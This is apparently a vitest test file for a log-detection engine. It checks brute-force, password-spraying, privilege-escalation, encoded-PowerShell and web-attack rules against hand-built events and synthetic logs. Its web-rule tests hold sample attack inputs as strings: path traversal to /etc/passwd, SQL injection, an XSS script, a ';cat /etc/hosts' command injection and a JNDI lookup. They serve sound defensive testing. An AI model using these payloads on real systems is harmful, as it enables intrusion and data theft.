import { existsSync, readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { sampleAccessLog, sampleAuthLog, sampleWindowsXml } from '../fixtures';
import { decodeTwice, matchWebPatterns, RULES, runDetections, windowBursts, type RuleId } from './detections';
import type { LogEvent } from './model';
import { parseSyslog, parseWebAccess, parseWindowsXml } from './parsers';

const UTC = { endYear: 2026, offsetMinutes: 0 };
const T0 = Date.parse('2026-01-10T10:00:00Z');
let nextId = 0;

function ev(partial: Partial<LogEvent>): LogEvent {
  nextId += 1;
  return {
    id: nextId,
    file: 0,
    line: nextId,
    timestamp: T0,
    timeQuality: 'exact',
    format: 'syslog',
    host: 'h',
    program: 'sshd',
    message: '',
    category: 'other',
    user: null,
    srcIp: null,
    count: 1,
    http: null,
    windows: null,
    fields: {},
    ...partial,
  };
}

const fail = (seconds: number, ip: string | null, user: string | null, count = 1) => ev({ category: 'authFailure', timestamp: T0 + seconds * 1000, srcIp: ip, user, count, fields: { service: 'ssh' } });
const ok = (seconds: number, ip: string, user: string) => ev({ category: 'authSuccess', timestamp: T0 + seconds * 1000, srcIp: ip, user, fields: { service: 'ssh', method: 'password' } });
const req = (seconds: number, ip: string, path: string, status = 200, agent = 'Mozilla/5.0') =>
  ev({ category: 'httpRequest', format: 'webAccess', timestamp: T0 + seconds * 1000, srcIp: ip, http: { method: 'GET', path, protocol: 'HTTP/1.1', status, bytes: 0, referrer: null, userAgent: agent, malformed: false } });

const rules = (events: LogEvent[], id: RuleId) => runDetections(events).findings.filter((finding) => finding.rule === id);

describe('windowBursts', () => {
  it('returns only events inside a qualifying window and splits distant bursts', () => {
    const events = [fail(0, 'a', 'u'), fail(10, 'a', 'u'), fail(20, 'a', 'u'), fail(1000, 'a', 'u'), fail(1010, 'a', 'u'), fail(1020, 'a', 'u'), fail(5000, 'a', 'u')];
    const bursts = windowBursts(events, 60_000, 3);
    expect(bursts.map((burst) => burst.length)).toEqual([3, 3]);
  });
});

describe('remote brute force', () => {
  it('fires at the threshold inside the window', () => {
    const events = Array.from({ length: 10 }, (_, index) => fail(index * 20, '203.0.113.9', 'root'));
    const [finding] = rules(events, 'remoteBruteForce');
    expect(finding).toMatchObject({ entity: { kind: 'ip', value: '203.0.113.9' }, count: 10 });
    expect(finding?.eventIds).toHaveLength(10);
  });

  it('does not fire one below the threshold or just outside the window', () => {
    expect(rules(Array.from({ length: 9 }, (_, index) => fail(index, '203.0.113.9', 'root')), 'remoteBruteForce')).toEqual([]);
    expect(rules(Array.from({ length: 10 }, (_, index) => fail(index * 34, '203.0.113.9', 'root')), 'remoteBruteForce')).toEqual([]);
  });

  it('counts "message repeated" lines by their count', () => {
    expect(rules([fail(0, '203.0.113.9', 'root', 6), fail(10, '203.0.113.9', 'root', 4)], 'remoteBruteForce')).toHaveLength(1);
  });

  it('excludes events without a timestamp and reports them', () => {
    const events = Array.from({ length: 12 }, () => ev({ category: 'authFailure', timestamp: null, timeQuality: 'missing', srcIp: '203.0.113.9', user: 'root' }));
    const result = runDetections(events);
    expect(result.findings.filter((finding) => finding.rule === 'remoteBruteForce')).toEqual([]);
    expect(result.excludedWithoutTime.remoteBruteForce).toBe(12);
  });
});

describe('password spraying and account failures', () => {
  it('fires on five distinct users from one source, not on four', () => {
    expect(rules(['a', 'b', 'c', 'd', 'e'].map((user, index) => fail(index * 60, '203.0.113.20', user)), 'passwordSpraying')).toHaveLength(1);
    expect(rules(['a', 'b', 'c', 'd', 'd', 'd'].map((user, index) => fail(index * 60, '203.0.113.20', user)), 'passwordSpraying')).toEqual([]);
  });

  it('fires on five failures for one account across sources, not on four', () => {
    expect(rules(['1', '2', '3', '4', '5'].map((last, index) => fail(index * 30, `198.51.100.${last}`, 'Alice')), 'userFailures')[0]).toMatchObject({ entity: { kind: 'user', value: 'alice' }, detail: { sources: 5 } });
    expect(rules(['1', '2', '3', '4'].map((last, index) => fail(index * 30, `198.51.100.${last}`, 'alice')), 'userFailures')).toEqual([]);
  });
});

describe('success after failures', () => {
  it('fires when a success follows enough failures within the window', () => {
    const events = [...Array.from({ length: 5 }, (_, index) => fail(index, '203.0.113.30', 'bob')), ok(100, '203.0.113.30', 'bob')];
    expect(rules(events, 'successAfterFailures')[0]).toMatchObject({ entity: { value: '203.0.113.30' }, detail: { failures: 5, user: 'bob' } });
  });

  it('does not fire when the failures are older than the window or too few', () => {
    expect(rules([...Array.from({ length: 5 }, (_, index) => fail(index, '203.0.113.30', 'bob')), ok(31 * 60, '203.0.113.30', 'bob')], 'successAfterFailures')).toEqual([]);
    expect(rules([...Array.from({ length: 4 }, (_, index) => fail(index, '203.0.113.30', 'bob')), ok(60, '203.0.113.30', 'bob')], 'successAfterFailures')).toEqual([]);
  });
});

describe('single-event rules', () => {
  it('flags root SSH logins but not other users', () => {
    expect(rules([ok(0, '192.0.2.1', 'root')], 'rootLogin')).toHaveLength(1);
    expect(rules([ok(0, '192.0.2.1', 'alice')], 'rootLogin')).toEqual([]);
  });

  it('flags privilege escalation indicators but not routine sudo', () => {
    const shell = ev({ category: 'sudoCommand', user: 'alice', fields: { targetUser: 'root', command: '/bin/bash' } });
    const apt = ev({ category: 'sudoCommand', user: 'alice', fields: { targetUser: 'root', command: '/usr/bin/apt update' } });
    const denied = ev({ category: 'sudoNotAllowed', user: 'bob', fields: { targetUser: 'root', command: '/bin/ls' } });
    expect(rules([shell, apt, denied], 'privilegeEscalation').map((finding) => finding.detail.reason)).toEqual(['rootShell', 'notInSudoers']);
  });

  it('flags encoded PowerShell and not a plain invocation', () => {
    const encoded = ev({ format: 'windowsXml', windows: { eventId: 4688, provider: null, channel: null, computer: 'WS01', data: { CommandLine: 'powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' } }, category: 'processCreated' });
    const plain = ev({ format: 'windowsXml', windows: { eventId: 4688, provider: null, channel: null, computer: 'WS01', data: { CommandLine: 'powershell.exe -File backup.ps1' } }, category: 'processCreated' });
    expect(rules([encoded, plain], 'encodedPowerShell')).toHaveLength(1);
  });
});

describe('web rules', () => {
  it.each([
    ['/download?file=../../etc/passwd', ['sensitiveFile', 'traversal']],
    ['/download?file=%252e%252e%252fetc', ['traversal']],
    ["/item?id=1' OR '1'='1", ['sqlInjection']],
    ['/s?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', ['xss']],
    ['/ping?h=1;cat%20/etc/hosts', ['commandInjection']],
    ['/x?a=${jndi:ldap://192.0.2.1/a}', ['jndi']],
    ['/uploads/shell.php', ['webShell']],
  ])('matches %s', (path, kinds) => {
    expect(matchWebPatterns(req(0, '192.0.2.1', path)).sort()).toEqual([...kinds].sort());
  });

  it.each(['/', '/products?id=12&category=shoes', '/blog/selecting-from-the-menu', '/search?q=union+station', '/assets/app.js'])('does not match the ordinary request %s', (path) => {
    expect(matchWebPatterns(req(0, '192.0.2.1', path))).toEqual([]);
  });

  it('decodes at most twice', () => {
    expect(decodeTwice('%25252e')).toBe('%2e');
    expect(decodeTwice('%E0%A4%A')).toBe('%E0%A4%A');
  });

  it('flags scanning by client errors at the threshold and by user agent', () => {
    expect(rules(Array.from({ length: 20 }, (_, index) => req(index, '203.0.113.40', `/p${index}`, 404)), 'webScanning')[0]?.detail.reason).toBe('clientErrors');
    expect(rules(Array.from({ length: 19 }, (_, index) => req(index, '203.0.113.40', `/p${index}`, 404)), 'webScanning')).toEqual([]);
    expect(rules([req(0, '203.0.113.41', '/', 200, 'Mozilla/5.0 (compatible; Nmap Scripting Engine)')], 'webScanning')[0]?.detail).toEqual({ reason: 'scannerAgent', agent: 'nmap' });
  });

  it('flags request bursts at the threshold only', () => {
    expect(rules(Array.from({ length: 300 }, (_, index) => req(index * 0.1, '203.0.113.42', '/')), 'requestBurst')).toHaveLength(1);
    expect(rules(Array.from({ length: 299 }, (_, index) => req(index * 0.1, '203.0.113.42', '/')), 'requestBurst')).toEqual([]);
  });
});

describe('detections on the synthetic samples', () => {
  it('finds the expected activity in the auth log', () => {
    const events = parseSyslog(sampleAuthLog(), UTC).events.map((event, index) => ({ ...event, id: index, file: 0 }));
    const found = new Set(runDetections(events).findings.map((finding) => finding.rule));
    expect([...found].sort()).toEqual(['accountChanges', 'passwordSpraying', 'privilegeEscalation', 'remoteBruteForce', 'rootLogin', 'successAfterFailures'].sort());
  });

  it('finds scanning and attacks in the access log', () => {
    const events = parseWebAccess(sampleAccessLog()).events.map((event, index) => ({ ...event, id: index, file: 0 }));
    const result = runDetections(events).findings;
    expect(result.filter((finding) => finding.rule === 'webScanning').map((finding) => finding.entity.value)).toEqual(['203.0.113.77', '203.0.113.78']);
    expect(result.find((finding) => finding.rule === 'suspiciousWebRequest' && finding.entity.value === '203.0.113.78')?.detail.kinds).toBe('commandInjection, sensitiveFile, sqlInjection, traversal, xss');
  });

  it('finds the Windows brute force, success, group change and log clearing', () => {
    const events = parseWindowsXml(sampleWindowsXml()).events.map((event, index) => ({ ...event, id: index, file: 0 }));
    const found = runDetections(events).findings.map((finding) => finding.rule);
    expect(found).toEqual(expect.arrayContaining(['successAfterFailures', 'userFailures', 'accountChanges', 'logCleared']));
    expect(found).not.toContain('remoteBruteForce');
  });
});

describe('rule metadata', () => {
  it('uses ATT&CK techniques present in the published dataset', () => {
    const file = 'public/data/attack.json';
    if (!existsSync(file)) return;
    const ids = new Set((JSON.parse(readFileSync(file, 'utf8')) as { techniques: { id: string }[] }).techniques.map((technique) => technique.id));
    for (const rule of RULES) for (const technique of rule.techniques) expect(ids.has(technique), `${rule.id} ${technique}`).toBe(true);
  });
});
